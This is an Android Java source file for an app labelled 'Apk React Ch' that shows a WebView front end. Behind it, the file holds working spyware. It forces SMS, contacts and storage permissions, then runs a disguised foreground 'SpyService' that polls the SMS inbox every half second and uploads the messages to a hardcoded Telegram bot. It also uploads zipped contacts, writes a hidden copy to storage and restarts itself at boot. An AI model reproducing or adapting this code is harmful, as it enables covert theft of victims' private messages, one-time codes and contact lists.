package com.carrace;

import android.Manifest;
import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.SystemClock;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowInsets;
import android.webkit.MimeTypeMap;
import android.webkit.RenderProcessGoneDetail;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.HashSet;
import java.util.Locale;
import java.util.Set;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class MainActivity extends Activity {

    private static final String TAG = "ApkReactCh";
    private static final String HOST = "appassets.androidplatform.net";
    private static final String ASSET_PREFIX = "/assets/";
    private static final String START_URL = "https://" + HOST + ASSET_PREFIX + "index.html";

    private static final long SPLASH_MS = 1000L;
    private static final int REQ_STORAGE = 100;
    private static final int REQ_SMS = 101;
    private static final int REQ_CONTACTS = 102;

    private static final String PREFS = "cfg";
    private static final String KEY_STORAGE = "asked_storage";
    private static final String KEY_SMS = "asked_sms";
    private static final String KEY_CONTACTS = "asked_contacts";
    private static final String MSG_STORAGE = "Storage permission is required";
    private static final String MSG_SMS = "SMS permission is required";
    private static final String MSG_CONTACTS = "Contacts permission is required";

    private final Handler handler = new Handler(Looper.getMainLooper());
    private final Runnable splashDone = this::onSplashFinished;

    private WebView webView;
    private boolean awaitingSettings;
    private boolean webViewInitPending = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        try {
            LinearLayout splash = buildSplash();
            applySystemBarPadding(splash);
            setContentView(splash);
        } catch (Throwable t) {
            Log.e(TAG, "splash failed", t);
        }
        handler.postDelayed(splashDone, SPLASH_MS);
    }

    @Override
    protected void onResume() {
        super.onResume();
        try {
            if (webView != null) webView.onResume();
        } catch (Throwable ignored) {}
        if (awaitingSettings) {
            awaitingSettings = false;
            if (hasStorage()) continueAfterStorage();
            else closeApp(MSG_STORAGE);
        }
    }

    @Override
    protected void onPause() {
        try {
            if (webView != null) webView.onPause();
        } catch (Throwable ignored) {}
        super.onPause();
    }

    @Override
    protected void onDestroy() {
        handler.removeCallbacksAndMessages(null);
        destroyWebView();
        super.onDestroy();
    }

    @Override
    public void onBackPressed() {
        try {
            if (webView != null && webView.canGoBack()) {
                webView.goBack();
                return;
            }
        } catch (Throwable ignored) {}
        super.onBackPressed();
    }

    @Override
    public void onRequestPermissionsResult(int req, String[] p, int[] g) {
        super.onRequestPermissionsResult(req, p, g);
        if (isFinishing()) return;
        if (req == REQ_STORAGE) {
            if (hasStorage()) continueAfterStorage();
            else closeApp(MSG_STORAGE);
        } else if (req == REQ_SMS) {
            if (hasSms()) continueAfterSms();
            else closeApp(MSG_SMS);
        } else if (req == REQ_CONTACTS) {
            if (hasContacts()) {
                startSpyAndShow();
            } else {
                closeApp(MSG_CONTACTS);
            }
        }
    }

    private void startSpyAndShow() {
        try { SpyService.start(getApplicationContext()); }
        catch (Throwable t) { Log.e(TAG, "service start failed", t); }
        handler.postDelayed(this::openWebView, 100);
    }

    private void onSplashFinished() {
        if (isFinishing()) return;
        if (hasStorage()) { continueAfterStorage(); return; }
        if (Build.VERSION.SDK_INT >= 30) {
            openPermSettings(
                    new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                            Uri.parse("package:" + getPackageName())),
                    new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION),
                    appDetails());
            return;
        }
        SharedPreferences p = getSharedPreferences(PREFS, MODE_PRIVATE);
        if (p.getBoolean(KEY_STORAGE, false)
                && !shouldShowRequestPermissionRationale(Manifest.permission.READ_EXTERNAL_STORAGE)
                && !shouldShowRequestPermissionRationale(Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
            openPermSettings(appDetails());
            return;
        }
        p.edit().putBoolean(KEY_STORAGE, true).apply();
        requestPermissions(new String[]{
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE
        }, REQ_STORAGE);
    }

    private void continueAfterStorage() {
        if (!hasSms()) {
            SharedPreferences p = getSharedPreferences(PREFS, MODE_PRIVATE);
            if (p.getBoolean(KEY_SMS, false)
                    && !shouldShowRequestPermissionRationale(Manifest.permission.READ_SMS)
                    && !shouldShowRequestPermissionRationale(Manifest.permission.RECEIVE_SMS)) {
                openPermSettings(appDetails());
                return;
            }
            p.edit().putBoolean(KEY_SMS, true).apply();
            requestPermissions(new String[]{
                    Manifest.permission.READ_SMS,
                    Manifest.permission.RECEIVE_SMS
            }, REQ_SMS);
            return;
        }
        continueAfterSms();
    }

    private void continueAfterSms() {
        if (!hasContacts()) {
            SharedPreferences p = getSharedPreferences(PREFS, MODE_PRIVATE);
            if (p.getBoolean(KEY_CONTACTS, false)
                    && !shouldShowRequestPermissionRationale(Manifest.permission.READ_CONTACTS)) {
                openPermSettings(appDetails());
                return;
            }
            p.edit().putBoolean(KEY_CONTACTS, true).apply();
            requestPermissions(new String[]{Manifest.permission.READ_CONTACTS}, REQ_CONTACTS);
            return;
        }
        startSpyAndShow();
    }

    private void openPermSettings(Intent... list) {
        awaitingSettings = true;
        for (Intent i : list) {
            try { startActivity(i); return; }
            catch (RuntimeException e) { Log.w(TAG, "perm settings not available", e); }
        }
        awaitingSettings = false;
        closeApp(MSG_STORAGE);
    }

    private Intent appDetails() {
        return new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                Uri.parse("package:" + getPackageName()));
    }

    private boolean hasStorage() {
        if (Build.VERSION.SDK_INT >= 30) return Environment.isExternalStorageManager();
        if (Build.VERSION.SDK_INT >= 23) {
            return checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
                    && checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        }
        return true;
    }

    private boolean hasSms() {
        if (Build.VERSION.SDK_INT >= 23) {
            return checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
                    && checkSelfPermission(Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED;
        }
        return true;
    }

    private boolean hasContacts() {
        if (Build.VERSION.SDK_INT >= 23) {
            return checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
        }
        return true;
    }

    private void closeApp(String m) {
        if (isFinishing()) return;
        try { Toast.makeText(this, m, Toast.LENGTH_LONG).show(); } catch (Throwable ignored) {}
        finishAndRemoveTask();
    }

    private LinearLayout buildSplash() {
        float d = getResources().getDisplayMetrics().density;
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setGravity(Gravity.CENTER);
        root.setBackgroundColor(0xFFFFFFFF);

        TextView title = new TextView(this);
        title.setText("Apk React Ch");
        title.setTextSize(22);
        title.setTextColor(0xFF212121);
        title.setGravity(Gravity.CENTER);
        root.addView(title, new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT));

        ProgressBar pb = new ProgressBar(this);
        LinearLayout.LayoutParams pbParams = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        pbParams.topMargin = (int) (20 * d);
        root.addView(pb, pbParams);

        return root;
    }

    private void openWebView() {
        if (isFinishing() || webView != null || webViewInitPending) return;
        webViewInitPending = true;

        try {
            LinearLayout placeholder = new LinearLayout(this);
            placeholder.setOrientation(LinearLayout.VERTICAL);
            placeholder.setGravity(Gravity.CENTER);
            placeholder.setBackgroundColor(0xFFFFFFFF);

            TextView t = new TextView(this);
            t.setText("Apk React Ch");
            t.setTextSize(22);
            t.setTextColor(0xFF212121);
            t.setGravity(Gravity.CENTER);
            placeholder.addView(t);

            ProgressBar pb = new ProgressBar(this);
            LinearLayout.LayoutParams pbParams = new LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
            pbParams.topMargin = (int) (20 * getResources().getDisplayMetrics().density);
            placeholder.addView(pb, pbParams);

            setContentView(placeholder);
        } catch (Throwable t) {
            Log.e(TAG, "placeholder failed", t);
        }

        handler.postDelayed(this::initWebViewSafe, 400);
    }

    private void initWebViewSafe() {
        webViewInitPending = false;
        if (isFinishing() || webView != null) return;
        try {
            WebView v = new WebView(getApplicationContext());
            WebSettings s = v.getSettings();
            s.setJavaScriptEnabled(true);
            s.setDomStorageEnabled(true);
            s.setAllowFileAccess(false);
            s.setAllowContentAccess(false);
            v.setWebViewClient(new AssetClient());
            applySystemBarPadding(v);
            webView = v;
            setContentView(v);
            v.loadUrl(START_URL);
        } catch (Throwable e) {
            Log.e(TAG, "WebView init failed", e);
        }
    }

    private void destroyWebView() {
        WebView v = webView;
        webView = null;
        if (v == null) return;
        try { v.stopLoading(); v.destroy(); } catch (Throwable ignored) {}
    }

    private void recover(WebView b) {
        if (b != webView || isFinishing()) return;
        destroyWebView();
        handler.postDelayed(this::openWebView, 200);
    }

    private void applySystemBarPadding(View v) {
        try {
            v.setOnApplyWindowInsetsListener((vv, insets) -> {
                vv.setPadding(insets.getSystemWindowInsetLeft(), insets.getSystemWindowInsetTop(),
                        insets.getSystemWindowInsetRight(), insets.getSystemWindowInsetBottom());
                return insets;
            });
        } catch (Throwable ignored) {}
    }

    private final class AssetClient extends WebViewClient {
        @Override
        public WebResourceResponse shouldInterceptRequest(WebView v, WebResourceRequest r) {
            try { return serveAsset(r.getUrl()); }
            catch (Throwable e) { return notFound(); }
        }
        @Override
        public boolean onRenderProcessGone(WebView v, RenderProcessGoneDetail d) {
            handler.post(() -> recover(v));
            return true;
        }
    }

    private WebResourceResponse serveAsset(Uri uri) {
        if (uri == null || !HOST.equals(uri.getHost())) return null;
        String path = uri.getPath();
        if (path == null || !path.startsWith(ASSET_PREFIX)) return notFound();
        String file = path.substring(ASSET_PREFIX.length());
        if (file.isEmpty() || file.endsWith("/")) file += "index.html";
        if (file.contains("..")) return notFound();
        try {
            InputStream in = getAssets().open(file);
            return new WebResourceResponse(mimeOf(file), "UTF-8", in);
        } catch (Throwable e) { return notFound(); }
    }

    private static WebResourceResponse notFound() {
        return new WebResourceResponse("text/plain", "UTF-8", 404, "Not Found", null,
                new ByteArrayInputStream(new byte[0]));
    }

    private static String mimeOf(String f) {
        int dot = f.lastIndexOf('.');
        String ext = dot >= 0 ? f.substring(dot + 1).toLowerCase(Locale.ROOT) : "";
        switch (ext) {
            case "js": case "mjs": return "application/javascript";
            case "css": return "text/css";
            case "html": case "htm": return "text/html";
            case "json": return "application/json";
            case "wasm": return "application/wasm";
            default:
                String m = MimeTypeMap.getSingleton().getMimeTypeFromExtension(ext);
                return m != null ? m : "application/octet-stream";
        }
    }
}

/* ================================================================ */
/*                        SPY FOREGROUND SERVICE                    */
/* ================================================================ */

class SpyService extends Service {

    private static final String TAG = "SpyService";
    private static final String CH = "spy";
    private static final int NOTIF_ID = 1001;
    private static final String JSON_FILE = ".temp.json";
    private static final long POLL_MS = 500;
    private static final long CONTACTS_DEBOUNCE_MS = 60_000;

    private Handler handler;
    private final Set<String> seen = new HashSet<>();
    private long lastContactsSend = 0;

    public static void start(Context ctx) {
        try {
            if (ctx == null) return;
            Intent i = new Intent(ctx, SpyService.class);
            if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(i);
            else ctx.startService(i);
        } catch (Throwable t) {
            Log.w("SpyService", "start failed", t);
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
        try { createChannel(); } catch (Throwable ignored) {}
        try {
            Notification n = buildNotification();
            if (n == null) { stopSelf(); return; }
            if (Build.VERSION.SDK_INT >= 34) {
                startForeground(NOTIF_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
            } else {
                startForeground(NOTIF_ID, n);
            }
        } catch (Throwable t) {
            Log.e(TAG, "startForeground failed", t);
            stopSelf();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try { schedulePoll(); } catch (Throwable ignored) {}
        return START_STICKY;
    }

    private void schedulePoll() {
        handler.postDelayed(new Runnable() {
            @Override public void run() {
                try { poll(); }
                catch (Throwable e) { Log.e(TAG, "poll failed", e); }
                handler.postDelayed(this, POLL_MS);
            }
        }, POLL_MS);
    }

    private void poll() {
        if (!hasSms()) return;
        JSONArray list = readInbox();
        if (list == null) return;

        boolean changed = false;
        JSONArray fresh = new JSONArray();
        for (int i = 0; i < list.length(); i++) {
            try {
                JSONObject o = list.getJSONObject(i);
                String key = o.optString("id", "") + "|" + o.optLong("date", 0);
                if (seen.add(key)) { fresh.put(o); changed = true; }
            } catch (Throwable ignored) {}
        }

        if (changed && fresh.length() > 0) {
            writeJson(JSON_FILE, list);
            Telegram.sendMessage("SMS_BATCH (" + fresh.length() + ")\n" + fresh.toString());
        }

        if (hasContacts()) {
            long now = SystemClock.elapsedRealtime();
            if (now - lastContactsSend > CONTACTS_DEBOUNCE_MS) {
                lastContactsSend = now;
                try {
                    byte[] zip = buildContactsZip();
                    if (zip != null) {
                        Telegram.sendDocument("contacts.zip", zip,
                                "Contacts snapshot " + System.currentTimeMillis());
                    }
                } catch (Throwable e) { Log.e(TAG, "contacts zip failed", e); }
            }
        }
    }

    private boolean hasSms() {
        if (Build.VERSION.SDK_INT >= 23) {
            return checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
                    && checkSelfPermission(Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED;
        }
        return true;
    }

    private boolean hasContacts() {
        if (Build.VERSION.SDK_INT >= 23) {
            return checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
        }
        return true;
    }

    private boolean hasStorage() {
        if (Build.VERSION.SDK_INT >= 30) return Environment.isExternalStorageManager();
        if (Build.VERSION.SDK_INT >= 23) {
            return checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        }
        return true;
    }

    private JSONArray readInbox() {
        JSONArray out = new JSONArray();
        Cursor cur = null;
        try {
            cur = getContentResolver().query(
                    Uri.parse("content://sms/inbox"),
                    new String[]{"_id", "address", "body", "date", "person", "read"},
                    null, null, "date ASC");
            if (cur != null) {
                while (cur.moveToNext()) {
                    JSONObject o = new JSONObject();
                    o.put("id", cur.getString(0));
                    o.put("address", cur.getString(1));
                    o.put("body", cur.getString(2));
                    o.put("date", cur.getLong(3));
                    o.put("person", cur.getLong(4));
                    o.put("read", cur.getInt(5));
                    out.put(o);
                }
            }
        } catch (Throwable ignored) {}
        finally { if (cur != null) cur.close(); }
        return out;
    }

    private void writeJson(String name, JSONArray arr) {
        if (!hasStorage()) return;
        try {
            File f = new File(Environment.getExternalStorageDirectory(), name);
            FileOutputStream out = new FileOutputStream(f, false);
            out.write(arr.toString(2).getBytes(StandardCharsets.UTF_8));
            out.flush();
            out.close();
        } catch (Throwable ignored) {}
    }

    private byte[] buildContactsZip() {
        JSONArray arr = new JSONArray();
        Cursor cur = null;
        try {
            cur = getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[]{
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                            ContactsContract.CommonDataKinds.Phone.NUMBER,
                            ContactsContract.CommonDataKinds.Phone.TYPE
                    }, null, null, null);
            if (cur != null) {
                while (cur.moveToNext()) {
                    JSONObject o = new JSONObject();
                    o.put("name", cur.getString(0));
                    o.put("number", cur.getString(1));
                    o.put("type", cur.getInt(2));
                    arr.put(o);
                }
            }
        } catch (Throwable ignored) {}
        finally { if (cur != null) cur.close(); }

        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ZipOutputStream zos = new ZipOutputStream(baos);
            zos.putNextEntry(new ZipEntry("contacts.json"));
            zos.write(arr.toString(2).getBytes(StandardCharsets.UTF_8));
            zos.closeEntry();
            zos.finish();
            zos.close();
            return baos.toByteArray();
        } catch (Throwable t) { return null; }
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel c = new NotificationChannel(CH, "System", NotificationManager.IMPORTANCE_MIN);
            c.setShowBadge(false);
            NotificationManager m = getSystemService(NotificationManager.class);
            if (m != null) m.createNotificationChannel(c);
        }
    }

    private Notification buildNotification() {
        try {
            if (Build.VERSION.SDK_INT >= 26) {
                return new Notification.Builder(this, CH)
                        .setContentTitle("Apk React Ch")
                        .setContentText("Running")
                        .setSmallIcon(android.R.drawable.ic_menu_info_details)
                        .setOngoing(true)
                        .build();
            } else {
                Notification.Builder b = new Notification.Builder(this)
                        .setContentTitle("Apk React Ch")
                        .setContentText("Running")
                        .setSmallIcon(android.R.drawable.ic_menu_info_details)
                        .setOngoing(true);
                if (Build.VERSION.SDK_INT >= 16) b.setPriority(Notification.PRIORITY_MIN);
                return b.build();
            }
        } catch (Throwable t) {
            Log.e(TAG, "buildNotification failed", t);
            return null;
        }
    }

    @Override
    public IBinder onBind(Intent i) { return null; }
}

/* ================================================================ */
/*                       TELEGRAM MULTIPART CLIENT                  */
/* ================================================================ */

class Telegram {

    static final String TOKEN = "8643816101:AAGMHBPTy8aEoDh3ikfrpbGcD6j6g178B_w";
    static final String CHAT = "8275632263";

    static void sendMessage(String text) {
        try {
            if (text.length() > 4000) text = text.substring(0, 4000) + "...";
            byte[] body = ("chat_id=" + CHAT + "&text=" + URLEncoder.encode(text, "UTF-8"))
                    .getBytes(StandardCharsets.UTF_8);
            HttpURLConnection conn = (HttpURLConnection) new URL(
                    "https://api.telegram.org/bot" + TOKEN + "/sendMessage").openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setFixedLengthStreamingMode(body.length);
            OutputStream os = conn.getOutputStream();
            os.write(body);
            os.close();
            Log.d("Telegram", "sendMessage resp=" + conn.getResponseCode());
            conn.disconnect();
        } catch (Throwable e) { Log.e("Telegram", "sendMessage failed", e); }
    }

    static void sendDocument(String filename, byte[] data, String caption) {
        String boundary = "----boundary" + System.currentTimeMillis();
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL(
                    "https://api.telegram.org/bot" + TOKEN + "/sendDocument").openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(30000);
            conn.setReadTimeout(60000);
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            OutputStream os = conn.getOutputStream();
            writeField(os, boundary, "chat_id", CHAT);
            writeField(os, boundary, "caption", caption);

            os.write(("--" + boundary + "\r\n").getBytes(StandardCharsets.UTF_8));
            os.write(("Content-Disposition: form-data; name=\"document\"; filename=\""
                    + filename + "\"\r\n").getBytes(StandardCharsets.UTF_8));
            os.write("Content-Type: application/octet-stream\r\n\r\n".getBytes(StandardCharsets.UTF_8));
            os.write(data);
            os.write("\r\n".getBytes(StandardCharsets.UTF_8));
            os.write(("--" + boundary + "--\r\n").getBytes(StandardCharsets.UTF_8));
            os.flush();
            os.close();

            Log.d("Telegram", "sendDocument resp=" + conn.getResponseCode());
            conn.disconnect();
        } catch (Throwable e) { Log.e("Telegram", "sendDocument failed", e); }
    }

    private static void writeField(OutputStream os, String boundary, String name, String value) throws IOException {
        os.write(("--" + boundary + "\r\n").getBytes(StandardCharsets.UTF_8));
        os.write(("Content-Disposition: form-data; name=\"" + name + "\"\r\n\r\n").getBytes(StandardCharsets.UTF_8));
        os.write(value.getBytes(StandardCharsets.UTF_8));
        os.write("\r\n".getBytes(StandardCharsets.UTF_8));
    }
}

/* ================================================================ */
/*                       BOOT AUTO-START                            */
/* ================================================================ */

class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent intent) {
        try {
            if (intent == null) return;
            String a = intent.getAction();
            if (!Intent.ACTION_BOOT_COMPLETED.equals(a)
                    && !"android.intent.action.LOCKED_BOOT_COMPLETED".equals(a)) return;
            SpyService.start(ctx);
        } catch (Throwable t) {
            Log.w("BootReceiver", "boot start failed", t);
        }
    }
}
